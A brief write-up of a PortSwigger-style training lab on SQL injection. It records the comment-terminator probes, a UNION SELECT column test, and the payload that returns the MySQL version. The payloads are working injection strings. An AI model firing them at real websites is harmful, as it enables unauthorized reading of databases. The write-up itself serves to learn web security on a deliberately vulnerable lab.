# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

This is a MySQL or Microsoft DB according to the lab info.

Try appending
- `'--` (error)
- `'-- `(error)
- `'#` (success)

The success of "#" to start the comment indicates that it is MySQL (see Comments section at https://portswigger.net/web-security/sql-injection/cheat-sheet).

There are two string columns to work with: `'UNION+SELECT+'a','a'#`

Use the second column for data, leave the first as NULL: `'UNION+SELECT+NULL,@@version#`

This returns the version: 8.0.27